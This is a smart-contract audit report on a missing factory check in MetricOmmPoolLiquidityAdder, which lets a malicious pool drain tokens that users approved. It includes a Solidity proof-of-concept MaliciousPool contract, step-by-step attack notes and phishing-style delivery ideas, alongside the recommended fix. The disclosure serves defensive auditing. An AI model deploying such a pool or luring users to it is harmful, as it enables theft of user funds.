Audit Report

## Title
Unvalidated `pool` Parameter in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

## Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address in `addLiquidityExactShares` and `addLiquidityWeighted` and stores it directly as the authoritative callback caller in transient storage without validating it against the factory. Because `metricOmmModifyLiquidityCallback` authenticates solely by comparing `msg.sender` to this attacker-controlled address, and then resolves token addresses by calling `getImmutables()` on that same `msg.sender`, a malicious pool can pull any ERC-20 token the victim has approved to the adder, up to the victim-supplied caps.

## Finding Description

`addLiquidityExactShares` and `addLiquidityWeighted` accept an unvalidated `pool` parameter and pass it directly to `_addLiquidity`: [1](#0-0) 

`_addLiquidity` stores the attacker-supplied address as the expected callback caller via `_setPayContext`: [2](#0-1) 

`_setPayContext` writes the unvalidated pool address to transient storage: [3](#0-2) 

In `metricOmmModifyLiquidityCallback`, the only authentication check compares `msg.sender` to `expectedPool` — which is the attacker-supplied address — so a malicious pool trivially passes: [4](#0-3) 

After passing authentication, the callback resolves token addresses by calling `getImmutables()` on `msg.sender` (the malicious pool), which can return any arbitrary token addresses: [5](#0-4) 

`pay` then calls `safeTransferFrom(payer, recipient, value)` where `payer` is the victim and `recipient` is the malicious pool: [6](#0-5) 

The contract's own NatSpec explicitly acknowledges this gap: [7](#0-6) 

By contrast, `MetricOmmSwapRouterBase` stores an immutable `FACTORY` and calls `_requireFactoryPool(pool)` before writing any pool address to transient context: [8](#0-7) [9](#0-8) 

The factory's `isPool` check is a simple mapping lookup that is already available: [10](#0-9) 

The `MetricOmmPoolLiquidityAdder` constructor takes only `weth` — no factory address is stored, so no validation path exists: [11](#0-10) 

## Impact Explanation

Any user who has granted a standing ERC-20 approval to `MetricOmmPoolLiquidityAdder` can have those tokens drained in a single transaction. The attacker controls which tokens are pulled (via `getImmutables()` returning arbitrary `token0`/`token1`) and how much is pulled (up to the victim-supplied `maxAmountToken0`/`maxAmountToken1` caps). Loss is direct, immediate, and bounded only by the victim's approval and the caps they pass. This is a direct loss of user principal, satisfying the Critical/High allowed impact gate.

## Likelihood Explanation

The attack requires no privileged role. Any unprivileged attacker can deploy a malicious pool contract. The victim must call `addLiquidityExactShares` or `addLiquidityWeighted` with the malicious pool address, which is achievable via a phishing front-end, a crafted referral link, or a malicious aggregator integration. Standing `type(uint256).max` approvals are standard practice for DeFi UIs, making the victim pool large. The attack is repeatable and leaves no on-chain trace distinguishing it from a legitimate liquidity add.

## Recommendation

Store the factory address as an immutable in the constructor (mirroring `MetricOmmSwapRouterBase`) and validate the `pool` parameter against it before storing it in transient context:

```solidity
// Constructor:
IMetricOmmPoolFactory internal immutable FACTORY;
constructor(address weth, address factory) PeripheryPayments(weth) {
    if (factory == address(0)) revert InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
}

// In _addLiquidity (or at the top of each public entry point):
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This ensures only pools deployed by the trusted factory can trigger token pulls, consistent with the guard already present in `MetricOmmSwapRouterBase._requireFactoryPool`.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

contract MaliciousPool {
    address public immutable victim;
    address public immutable drainToken; // e.g. USDC victim approved
    address public immutable adder;

    constructor(address _victim, address _drainToken, address _adder) {
        victim = _victim; drainToken = _drainToken; adder = _adder;
    }

    // Called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, bytes calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Callback into adder with KIND_PAY and full cap amount
        ILiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            1_000_000e6, 0, abi.encode(uint8(1)) // KIND_PAY
        );
        return (1_000_000e6, 0);
    }

    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = drainToken; // attacker picks any token victim approved
        imm.token1 = address(0);
    }
}

// Attack steps:
// 1. Deploy MaliciousPool(victim, USDC, adder)
// 2. victim calls: adder.addLiquidityExactShares(
//        maliciousPool, victim, 0, validDeltas, 1_000_000e6, 0, ""
//    )
// 3. _setPayContext stores maliciousPool as expectedPool, victim as payer
// 4. adder calls maliciousPool.addLiquidity(...)
// 5. maliciousPool calls metricOmmModifyLiquidityCallback(1_000_000e6, 0, KIND_PAY)
// 6. msg.sender == expectedPool (maliciousPool) ✓
// 7. amount0Delta (1_000_000e6) <= max0 (1_000_000e6) ✓
// 8. maliciousPool.getImmutables() → token0 = USDC
// 9. pay(USDC, victim, maliciousPool, 1_000_000e6)
//    → safeTransferFrom(victim, maliciousPool, 1_000_000e6)
// 10. 1,000,000 USDC drained from victim to attacker
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L37-37)
```text
  constructor(address weth) PeripheryPayments(weth) {}
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L64-68)
```text
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-167)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-196)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L20-25)
```text
  IMetricOmmPoolFactory internal immutable FACTORY;

  constructor(address factory) {
    if (factory == address(0)) revert IMetricOmmSimpleRouter.InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L149-151)
```text
  function isPool(address pool) external view override returns (bool) {
    return poolToIdx[pool] != 0;
  }
```
